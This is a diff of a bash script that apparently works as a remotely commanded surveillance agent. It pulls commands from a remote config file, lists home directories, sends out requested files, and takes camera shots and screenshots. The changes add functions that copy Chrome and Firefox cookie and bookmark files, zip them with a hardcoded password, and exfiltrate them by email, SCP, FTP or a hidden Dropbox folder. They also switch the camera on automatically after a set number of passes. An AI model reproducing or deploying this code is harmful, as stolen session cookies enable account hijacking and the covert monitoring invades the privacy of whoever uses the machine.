@@ -10,25 +10,25 @@ function check_connection {
 	[ $DEBUG -eq 1 ] && echo "DEBUG: Checking connection..."
 	CONNECTION_MODE=0
 	local RAND_NUMB=`shuf -i 1-5 | head -1`
-	[ $RAND_NUMB -eq 1 ] && ping -q -w 1 -c 1 www.google.com > /dev/null && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 2 ] && ping -q -w 1 -c 1 www.yahoo.com > /dev/null && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 3 ] && ping -q -w 1 -c 1 www.microsoft.com > /dev/null && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 4 ] && ping -q -w 1 -c 1 www.apple.com > /dev/null && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 5 ] && ping -q -w 1 -c 1 www.onet.pl > /dev/null && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 1 ] && \ping -q -w 1 -c 1 www.google.com > /dev/null && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 2 ] && \ping -q -w 1 -c 1 www.yahoo.com > /dev/null && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 3 ] && \ping -q -w 1 -c 1 www.microsoft.com > /dev/null && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 4 ] && \ping -q -w 1 -c 1 www.apple.com > /dev/null && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 5 ] && \ping -q -w 1 -c 1 www.onet.pl > /dev/null && CONNECTION_MODE=1 && return 0
 	local RAND_NUMB=`shuf -i 1-5 | head -1`
-	[ $RAND_NUMB -eq 1 ] && `wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.google.com/` && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 2 ] && `wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.yahoo.com/` && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 3 ] && `wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.microsoft.com/` && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 4 ] && `wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.apple.com/` && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 5 ] && `wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 1 ] && `\wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.google.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 2 ] && `\wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.yahoo.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 3 ] && `\wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.microsoft.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 4 ] && `\wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.apple.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 5 ] && `\wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
 }
 
 function check_smtp {
 	#return 0 # if connection false
 	[ $DEBUG -eq 1 ] && echo "DEBUG: Checking SMTP capabilities."
-	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
-	touch check.txt; echo "this is a test zip file">check.txt
-	zip -r "check.zip" -P 42p6b2V3hy7c92g42p6b2V3hy7c92g check.txt
+	DATA=`\date +"%Y-%m-%d-%H-%M-%S"`
+	\touch check.txt; echo "this is a test zip file">check.txt
+	\zip -r "check.zip" -P 42p6b2V3hy7c92g42p6b2V3hy7c92g check.txt
 	fsendemail "Test message - $DATA" "Test message" "check.zip"
 	if [[ $RESP == *"Email was sent successfully!" ]]
 	then
@@ -38,13 +38,14 @@ function check_smtp {
 		CONNECTION_SMTP=0
 		[ $DEBUG -eq 1 ] && echo "DEBUG: SMTP doesn't work."
 	fi
-	rm check.zip
-	rm check.txt
+	\rm check.zip
+	\rm check.txt
+	\sleep 5
 }
 
 function check_dir_size {
 	local DIR_NAME="$1"
-	local DIRSIZE=`du -s $DIR_NAME/ | cut -f 1`
+	local DIRSIZE=`\du -s $DIR_NAME/ | \cut -f 1`
 	local CLEAN_DIR_WHILE=0
 	[ ! -d $DIR_NAME ] && return 1
 	while [ $CLEAN_DIR_WHILE -lt 1 ]; do
@@ -56,58 +57,75 @@ function check_dir_size {
 		else
 			CLEAN_DIR_WHILE=$(($CLEAN_DIR_WHILE+1))
 		fi
-		DIRSIZE=`du -s $DIR_NAME/ | cut -f 1`
+		DIRSIZE=`\du -s $DIR_NAME/ | \cut -f 1`
 	done
 	[ $DIRSIZE -ge $3 ] && clean_dir $DIR_NAME
 	return 0
 }
 
 function clean_dir {
-	file=`/bin/ls -1 "$1" | sort --random-sort | head -1`
-	path=`readlink --canonicalize "$1/$file"` # Converts to full path
-	rm "$path"
+	file=`/bin/ls -1 "$1" | \sort --random-sort | \head -1`
+	path=`\readlink --canonicalize "$1/$file"` # Converts to full path
+	\rm "$path"
 	unset file
 	unset path
 }
 
 function remote_config {
+	# 1 - if to read old config file
+	# 2 - if to make commands
 	[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config"
 	ACTIVATE=0
 	[ ! -f "$REMOTE_CONFIG_NAME.old" ] && touch "$REMOTE_CONFIG_NAME.old"
 	# following cp command is for testing purposes only; delete it and uncomment wget command!
 	#cp WATCHER-hard.cfg WATCHER.cfg
-	`wget -q --no-cache --timeout=30 --tries=2 "$REMOTE_CONFIG_ADDRESS/$REMOTE_CONFIG_NAME"`
+	`\wget -q --no-cache --timeout=30 --tries=2 "$REMOTE_CONFIG_ADDRESS/$REMOTE_CONFIG_NAME"`
 	if [ $? -eq 1 ]
 	then
 		[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config - no success with downloading"
-		while read line_conf; do
-			remote_config_read "$line_conf"
-		# post other options here
-		# activate diiferent upload options
-		done < "$REMOTE_CONFIG_NAME.old"
+		if [ $1 -eq 1 ]
+		then
+			[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config - reading old config"
+			while read line_conf; do
+				remote_config_read "$line_conf"
+			# post other options here
+			# activate diiferent upload options
+			done < "$REMOTE_CONFIG_NAME.old"
+		fi
 	else
 		[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config - SUCCESS with downloading"
-		while read line_conf; do
-			remote_config_read "$line_conf"
-		# post other options here
-		done < $REMOTE_CONFIG_NAME
 		local MD5OLD=1
 		local MD5NEW=2
-		[ -f "$REMOTE_CONFIG_NAME.old" ] && MD5OLD=`md5sum "$REMOTE_CONFIG_NAME.old" | cut -d " " -f 1`
-		[ -f "$REMOTE_CONFIG_NAME" ] && MD5NEW=`md5sum "$REMOTE_CONFIG_NAME" | cut -d " " -f 1`
+		[ -f "$REMOTE_CONFIG_NAME.old" ] && MD5OLD=`\md5sum "$REMOTE_CONFIG_NAME.old" | cut -d " " -f 1`
+		[ -f "$REMOTE_CONFIG_NAME" ] && MD5NEW=`\md5sum "$REMOTE_CONFIG_NAME" | cut -d " " -f 1`
 		if [[ "$MD5NEW" != "$MD5OLD" ]]	
 		then
+			[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config - reading new config"
+			while read line_conf; do
+				remote_config_read "$line_conf"
+			# post other options here
+			done < $REMOTE_CONFIG_NAME
 			[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config - config files differs"
-			if [ $1 -eq 0 ]
+			if [ $2 -eq 1 ]
 			then
 				[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config - config files differs and we have green light to do commands"
-				mv "$REMOTE_CONFIG_NAME" "$REMOTE_CONFIG_NAME.old"
+				\mv "$REMOTE_CONFIG_NAME" "$REMOTE_CONFIG_NAME.old"
 				remote_command
+			fi
+		else
+			if [ $1 -eq 1 ]
+			then
+				[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config - reading old config"
+				while read line_conf; do
+					remote_config_read "$line_conf"
+				# post other options here
+				# activate diiferent upload options
+				done < "$REMOTE_CONFIG_NAME.old"
 			fi
 		fi
 
 	fi
-	[ -f "$REMOTE_CONFIG_NAME" ] && rm "$REMOTE_CONFIG_NAME"
+	[ -f "$REMOTE_CONFIG_NAME" ] && \rm "$REMOTE_CONFIG_NAME"
 	return 0
 }
 
@@ -115,7 +133,8 @@ function remote_config_read {
 	local line_conf1=`echo $1 | cut -d : -f 1`
 	local line_conf2=`echo $1 | cut -d : -f 2`
 	[ "$line_conf1" == "$REMOTE_ACTIVATION_PASS" ] && ACTIVATE=1 && echo "Pass OK"
-	[ "$line_conf1" == "disable_camera" ] && echo "Disable camera"
+	[ "$line_conf1" == "cemera_disable" ] && CAM_ENABLED=0 && CAM_PER_DISABLED=1
+	[ "$line_conf1" == "camera_enable" ] && CAM_ENABLED=1
 	[ "$line_conf1" == "SMTP-name" ] && SMTP_NAME_NEW="$line_conf2"
 	[ "$line_conf1" == "SMTP-serv" ] && SMTP_SERVER_NEW="$line_conf2"
 	[ "$line_conf1" == "SMTP-port" ] && SMTP_PORT_NEW="$line_conf2"
@@ -147,12 +166,16 @@ function remote_command {
 	[ "$line_conf1" == "filedata" ] && [ $ACTIVATE -eq 1 ] && file_data "$line_conf2"
 	[ "$line_conf1" == "dirdata" ] && [ $ACTIVATE -eq 1 ] && echo "Dir data"
 	[ "$line_conf1" == "downloadfile" ] && [ $ACTIVATE -eq 1 ] && remote_send_file "$line_conf2"
+	[ "$line_conf1" == "downloadcookies" ] && [ $ACTIVATE -eq 1 ] && remote_send_cookies
+	[ "$line_conf1" == "downloadbookmarks" ] && [ $ACTIVATE -eq 1 ] && remote_send_bookmarks
 	[ "$line_conf1" == "delfile" ] && [ $ACTIVATE -eq 1 ] && echo "Delete $line_conf2"
 	done < "$REMOTE_CONFIG_NAME.old"
 	if [ -f "tmp/remote.txt" ]
 	then
-		remote_send_file "tmp/remote.txt"
-		rm "tmp/remote.txt"
+		\zip -9 -r "tmp/remote.zip" "tmp/remote.txt"
+		\rm "tmp/remote.txt"
+		remote_send_file "tmp/remote.zip"
+		\rm "tmp/remote.zip"
 	fi
 }
 
@@ -204,44 +227,92 @@ function smtp_disable {
 }
 
 function file_list {
-	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
-	touch "tmp/remote.txt"
+	DATA=`\date +"%Y-%m-%d-%H-%M-%S"`
+	\touch "tmp/remote.txt"
 	echo "Command find executed on $DATA">>"tmp/remote.txt"
-	find /home/>"tmp/remote.txt"
+	\find $HOME>"tmp/remote.txt"
 }
 
 function file_data {
-	touch tmp/remote.txt
-	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
+	\touch tmp/remote.txt
+	DATA=`\date +"%Y-%m-%d-%H-%M-%S"`
 	echo "File $1 stat done: $DATA">>"tmp/remote.txt"
-	stat $1>>"tmp/remote.txt"
+	\stat $1>>"tmp/remote.txt"
+}
+
+function find_and_copy_file {
+	# 1 - name of file
+	# 2 - location
+	# 3 - destination
+	while read line
+	do
+		[ -f "$line" ] && \cp "$line" "$3"
+	done <<< "`\find \"$2\" -name \"$1\"`"
+}
+
+function remote_send_cookies {
+	DATA=`\date +"%Y-%m-%d-%H-%M-%S"`
+	\mkdir "tmp/cookies-$DATA"
+
+	# Chrome
+	\mkdir "tmp/cookies-$DATA/chrome"
+	find_and_copy_file "Cookies" "$HOME/.config/google-chrome/" "tmp/cookies-$DATA/chrome"
+
+	# Firefox
+	\mkdir "tmp/cookies-$DATA/firefox"
+	find_and_copy_file "cookies.sqlite" "$HOME/.mozilla/" "tmp/cookies-$DATA/firefox"
+
+	\zip -r "tosend/cookies-$DATA.zip" "tmp/cookies-$DATA"
+	remote_send_file "tosend/cookies-$DATA.zip"
+	\rm "tosend/cookies-$DATA.zip"
+	\rm -rf "tmp/cookies-$DATA"
+	return 0
+}
+
+function remote_send_bookmarks {
+	DATA=`\date +"%Y-%m-%d-%H-%M-%S"`
+	\mkdir "tmp/bookmarks-$DATA"
+
+	# Chrome
+	\mkdir "tmp/bookmarks-$DATA/chrome"
+	find_and_copy_file "Bookmarks" "$HOME/.config/google-chrome/" "tmp/bookmarks-$DATA/chrome"
+
+	# Firefox
+	\mkdir "tmp/bookmarks-$DATA/firefox"
+	find_and_copy_file "bookmarks.html" "$HOME/.mozilla" "tmp/bookmarks-$DATA/firefox"
+
+	\zip -r "tosend/bookmarks-$DATA.zip" "tmp/bookmarks-$DATA"
+	remote_send_file "tosend/bookmarks-$DATA.zip"
+	\rm "tosend/bookmarks-$DATA.zip"
+	\rm -rf "tmp/bookmarks-$DATA"
+	return 0
 }
 
 function remote_send_file {
 	[ $DEBUG -eq 1 ] && echo "remote_send_file $1"
 	[ ! -f "$1" ] && return 1
-	local FILESIZE=`du -s "$1" | cut -f 1`
-	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
+	local FILESIZE=`\du -s "$1" | \cut -f 1`
+	DATA=`\date +"%Y-%m-%d-%H-%M-%S"`
 	local FILE_NAME_sf="filerequest-$DATA-$RANDOM"
 	if [ $FILESIZE -le $MAX_ATACHEMENT_SIZE ]
 	then
 		[ $DEBUG -eq 1 ] && echo "DEBUG: File $1 smaller than max attachement size. SIZE:$FILESIZE"
-		zip -r "tmp/$FILE_NAME_sf.zip" -P 42p6b2V3hy7c92g42p6b2V3hy7c92g "$1"
+		\zip -r "tmp/$FILE_NAME_sf.tc" -P 42p6b2V3hy7c92g42p6b2V3hy7c92g "$1"
 		unset RESP
 		SENT=0
-		[[ $CONNECTION_SMTP -eq 1 ]] && echo "Send using SMTP" && fsendemail "SendRequestedFile - $DATA" "Requested file" "tmp/$FILE_NAME_sf.zip"
+		[[ $CONNECTION_SMTP -eq 1 ]] && echo "Send using SMTP" && fsendemail "SendRequestedFile - $DATA" "Requested file" "tmp/$FILE_NAME_sf.tc"
 		if [[ $RESP == *"Email was sent successfully!" ]]
 		then
 			SENT=1
-			rm "tmp/$FILE_NAME_sf.zip"
+			\rm "tmp/$FILE_NAME_sf.tc"
 			[ $DEBUG -eq 1 ] && echo "DEBUG: SMTP sent succesfully"
 		fi
-		[ -f "$1" ] && [ $R_SCP -eq 1 ] && run_scp "tmp/$FILE_NAME_sf.zip" 1
-		[ -f "$1" ] && [ $R_FTP -eq 1 ] && run_ftp "tmp/$FILE_NAME_sf.zip" 1
+		[ -f "$1" ] && [ $R_SCP -eq 1 ] && run_scp "tmp/$FILE_NAME_sf.tc" 1
+		[ -f "$1" ] && [ $R_FTP -eq 1 ] && run_ftp "tmp/$FILE_NAME_sf.tc" 1
 		[ ! -f "$1" ] && SENT=1 
-		#[ $R_DB_ext -eq 1 ] && [ -f "$1" ] && [ $DB_EXT_ACTIVE -eq 1 ] && run_dropbox_ext "tmp/$FILE_NAME_sf.zip" 1
-		[ $SENT -eq 0 ] && [ $R_DB -eq 1 ] && [ -f "$1" ] && run_dropbox_file "tmp/$FILE_NAME_sf.zip"
-		[ $SENT -eq 0 ] && mv "tmp/$FILE_NAME_sf.zip" tosendlater/
+		#[ $R_DB_ext -eq 1 ] && [ -f "$1" ] && [ $DB_EXT_ACTIVE -eq 1 ] && run_dropbox_ext "tmp/$FILE_NAME_sf.tc" 1
+		[ $SENT -eq 0 ] && [ $R_DB -eq 1 ] && [ -f "$1" ] && run_dropbox_file "tmp/$FILE_NAME_sf.tc"
+		[ $SENT -eq 0 ] && \mv "tmp/$FILE_NAME_sf.tc" tosendlater/
 		[ $DEBUG -eq 1 ] && echo "DEBUG: on exit: RESP:$RESP SENT:$SENT"
 		unset SENT
 	else
@@ -276,24 +347,24 @@ function send_later {
 	fi
 
 	local DIRsl="tosendlater"
-	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
+	DATA=`\date +"%Y-%m-%d-%H-%M-%S"`
 	local FILEsl=""
 	if [ "$(ls -A $DIRsl)" ]; then
-		local FILENAMEsl="tmp/package$DATA.zip"
-		local FILESIZEsl=`du -s $DIRsl/ | cut -f 1`
+		local FILENAMEsl="tmp/package$DATA.tc"
+		local FILESIZEsl=`\du -s $DIRsl/ | \cut -f 1`
 		#FILESIZE=$(stat -c%s "tmp/package$DATA.zip")
 		if [ $FILESIZEsl -le $MAX_ATACHEMENT_SIZEsl ]
 		then
-			zip -1 -r $FILENAMEsl $DIRsl
+			\zip -1 -r $FILENAMEsl -P 42p6b2V3hy7c92g42p6b2V3hy7c92g $DIRsl
 			fsendemail "SendLater - $DATA" "Data" "$FILENAMEsl"
 			if [[ $RESP == *"Email was sent successfully!" ]]
 			then
-				rm $FILENAMEsl
-				rm $DIRsl/*
+				\rm $FILENAMEsl
+				\rm $DIRsl/*
 				return 0 # which means everything is all right
 			else
-				rm $FILENAMEsl
-				local FILESIZE2sl=`du -s $DIRsl/ | cut -f 1`
+				\rm $FILENAMEsl
+				local FILESIZE2sl=`\du -s $DIRsl/ | \cut -f 1`
 				# exit with "2" signal which means that one big email was not send
 				[[ $FILESIZE2sl -ge $FILESIZEsl ]] && return 2
 			fi
@@ -303,18 +374,18 @@ function send_later {
 			for f in $FILESsl
 			do
 				# CHECK FILE SIZE BEFORE SENDING AND DELETE IF TO BIG AND IN tosendlater DIRUECTORY 
-				local fSIZEsl=`du -s $f | cut -f 1`
+				local fSIZEsl=`\du -s $f | \cut -f 1`
 				if [ $fSIZEsl -le $MAX_ATACHEMENT_SIZEsl ]
 				then
 					fsendemail "SendLater - $DATA" "Data" "$f"
 					if [[ $RESP == *"Email was sent successfully!" ]]
 					then
-						rm $f
+						\rm $f
 					else
 						return 1
 					fi
 				else
-					rm $f
+					\rm $f
 				fi			
 			done
 		fi
@@ -331,7 +402,7 @@ function run_dropbox {
 }
 
 function run_dropbox_file {
-	cp -u "$1" "$DB_DIR2"
+	\cp -u "$1" "$DB_DIR2"
 }
 
 function run_scp {
@@ -394,7 +465,12 @@ ACTIVATE=0
 REMOTE_COUNTER=0
 DB_EXT_ACTIVE=0
 T_CHECK_STATUS_CHANGE_COUNTER=0
+TOTAL_PASSES_COUNTER=0
+CAM_PER_DISABLED=0
 
+# Camera 1-enabled / 0-disabled
+CAM_ENABLED=0
+CAM_ENABLED_AFTER_PASSES=100
 
 # Becomes "1", when the first picture was made
 CAM_FIRST=0
@@ -411,13 +487,13 @@ R_SSH_REV=0
 
 # Dropbox directory, from script point of view
 DB_DIR="../Dropbox/.config"
-DB_DIR=`readlink --canonicalize "$DB_DIR"`
+DB_DIR=`\readlink --canonicalize "$DB_DIR"`
 # Another DB DIR which is used to upload files requested by you via remote_manager, when they are bigger than Max_Attachement_Size
 DB_DIR2="../Dropbox/.config-other"
-DB_DIR2=`readlink --canonicalize "$DB_DIR2"`
+DB_DIR2=`\readlink --canonicalize "$DB_DIR2"`
 DB_EXT_DIR=".config-ext"
-mkdir $DB_DIR
-mkdir $DB_DIR2
+\mkdir $DB_DIR
+\mkdir $DB_DIR2
 DB_EXT_USER=""
 DB_EXT_PASS=""
 
@@ -454,17 +530,17 @@ SSH_REV_FINAL="$SSH_REV_PORT1:$SSH_REV_LOCAL:$SSH_REV_PORT2 $SSH_REV_USER:$SSH_R
 ################
 # Script start
 ########
-sleep $T_INITIAL_DELAY
+\sleep $T_INITIAL_DELAY
 
 
 ################
 # Directory structure check
 ########
-rm -rf camera/*
-rm -rf screenshot/*
-rm -rf report/*
-rm -rf tmp/*
-rm -rf tosend/*
+\rm -rf camera/*
+\rm -rf screenshot/*
+\rm -rf report/*
+\rm -rf tmp/*
+\rm -rf tosend/*
 check_dir_size "tosendlater" $DIR_MAX_SIZE $DIR_WARNING_SIZE
 
 
@@ -475,13 +551,13 @@ check_connection
 check_smtp
 if [ $CONNECTION_MODE -eq 1 ]
 then
-	[ $REMOTE_CONFIG -eq 3 ] && remote_config 1
-	[ $REMOTE_CONFIG -eq 2 ] && remote_config 1 && ACTIVATE=1
-	[ $REMOTE_CONFIG -eq 1 ] && remote_config 1
+	[ $REMOTE_CONFIG -eq 3 ] && remote_config 1 0
+	[ $REMOTE_CONFIG -eq 2 ] && remote_config 1 0 && ACTIVATE=1
+	[ $REMOTE_CONFIG -eq 1 ] && remote_config 1 0
 	[ $REMOTE_CONFIG -eq 0 ] && ACTIVATE=1
 	[ $DEBUG -eq 1 ] && echo "DEBUG: ACTIVATE: $ACTIVATE"
 	[ $ACTIVATE -eq 0 ] && exit 0;
-	REMOTE_COUNTER=$REMOTE_CHECK_EVERY
+	REMOTE_COUNTER=$((REMOTE_CHECK_EVERY-10))
 fi
 
 
@@ -501,7 +577,7 @@ do
 	[ $DEBUG -eq 1 ] && echo "DEBUG: New big loop."
 	[ $DEBUG -eq 1 ] && echo "DEBUG: CONNECTION: $CONNECTION_MODE, SMTP:$CONNECTION_SMTP."
 	[ $DEBUG -eq 1 ] && echo "DEBUG: SMTP_COUNTER:$SMTP_COUNTER"
-	start_time=$(date +%s)
+	start_time=$(\date +%s)
 
 	################
 	# Rules: connecition
@@ -540,7 +616,7 @@ do
 	# Remote module
 	########
 	REMOTE_COUNTER=$(($REMOTE_COUNTER+1))
-	[ $CONNECTION_MODE -eq 1 ] && [ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && REMOTE_COUNTER=0 && remote_config 0;
+	[ $CONNECTION_MODE -eq 1 ] && [ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && REMOTE_COUNTER=0 && remote_config 0 1;
 	[ $ACTIVATE -eq 0 ] && [ $REMOTE_CONFIG -eq 3 ] && sleep $REMOTE_WAIT_TO_NEXT_CHECK && check_dir_size "tosendlater" $DIR_MAX_SIZE $DIR_WARNING_SIZE && continue;
 	[ $ACTIVATE -eq 0 ] && [ $CONNECTION_MODE -eq 1 ] && [ $REMOTE_CONFIG -eq 1 ] && ./stop.sh && exit 0;
 	[ $CONNECTION_MODE -eq 0 ] && [ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && DB_EXT_ACTIVE=0
@@ -557,15 +633,15 @@ do
 		# It's not first picture
 			if [ $((CAM_COUNTER)) -ge $((T_CAM_EVERY)) ]
 			then
-				./camera.sh $T_CAM_DELAY 0 &
+				[ $CAM_ENABLED -eq 1 ] && ./camera.sh $T_CAM_DELAY 0 &
 				CAM_COUNTER=0
-				sleep 10
+				\sleep 10
 			fi
 		else
 		# It's first picture → capture and send as soon as possible
 			CAM_FIRST=1
-			./camera.sh 0 1 &
-			sleep 10
+			[ $CAM_ENABLED -eq 1 ] &&  ./camera.sh 0 1 &
+			\sleep 10
 		fi
 		run_send_later
 	else
@@ -575,7 +651,7 @@ do
 			# ./camera.sh $T_CAM_DELAY 0 &      # 
 		#	CAM_COUNTER=0
 		#fi
-		sleep 0
+		\sleep 0
 	fi
 
 	if [[ $CONNECTION_MODE -eq 1 ]] && [[ $CONNECTION_SMTP -eq 0 ]]
@@ -584,14 +660,14 @@ do
 		[[ $R_DB -eq 1 ]] && run_dropbox
 		[[ $R_SCP -eq 1 ]] && ./a_up_scp.sh
 		[[ $R_FTP -eq 1 ]] && ./a_up_ftp.sh
-		sleep 0
+		\sleep 0
 	fi
 
 	if [ $CONNECTION_MODE -eq 0 ]
 	then
 	# when connection is down, still try to upload by dropbox, mayby he will be able to connect
 		[[ $R_DB -eq 1 ]] && run_dropbox
-		sleep 0
+		\sleep 0
 	fi
 
 
@@ -606,9 +682,23 @@ do
 	fi 
 
 
-	finish_time=$(date +%s)
+	################
+	# Camera activation even without remote module involved - when script thinks if it gathered enought information different way.
+	######## 
+	[ $DEBUG -eq 1 ] && echo "DEBUG: Camera settings: CAM_ENABLED=$CAM_ENABLED, CAM_PER_DISABLED=$CAM_PER_DISABLED."
+	[[ $CONNECTION_MODE -eq 1 ]] && [[ $CONNECTION_SMTP -eq 1 ]] && TOTAL_PASSES_COUNTER=$(($TOTAL_PASSES_COUNTER+1))
+	[[ $TOTAL_PASSES_COUNTER -ge $CAM_ENABLED_AFTER_PASSES ]] && CAM_ENABLED=1 && CAM_COUNTER=$T_CAM_EVERY
+	[[ $CAM_PER_DISABLED -eq 1 ]] && CAM_ENABLED=0
+	[ $DEBUG -eq 1 ] && echo "DEBUG: Camera settings: CAM_ENABLED=$CAM_ENABLED, CAM_PER_DISABLED=$CAM_PER_DISABLED."
+
+
+	################
+	# Execution time
+	########
+	finish_time=$(\date +%s)
 	time_duration=$((finish_time - start_time))
  	[ $DEBUG -eq 1 ] && echo "DEBUG: Execution time: $time_duration secconds."
+
 
 	################
 	# Sleep for a while
@@ -617,10 +707,10 @@ do
 	if [ $SLEEP_TIME -ge 10 ]
 	then
 		[ $DEBUG -eq 1 ] && echo "DEBUG: Sleep for $SLEEP_TIME sec."
-		sleep $SLEEP_TIME
+		\sleep $SLEEP_TIME
 	else
 		[ $DEBUG -eq 1 ] && echo "DEBUG: Sleep for 10 sec."
-		sleep 10
+		\sleep 10
 	fi
 	if [ $T_CHECK_STATUS_CHANGE_COUNTER -ge $T_CHECK_STATUS_CHANGE ]
 	then
@@ -631,6 +721,7 @@ do
 
 
 	./kill_soft2.sh "camera.sh" &
+
 
 	################
 	# Check connection
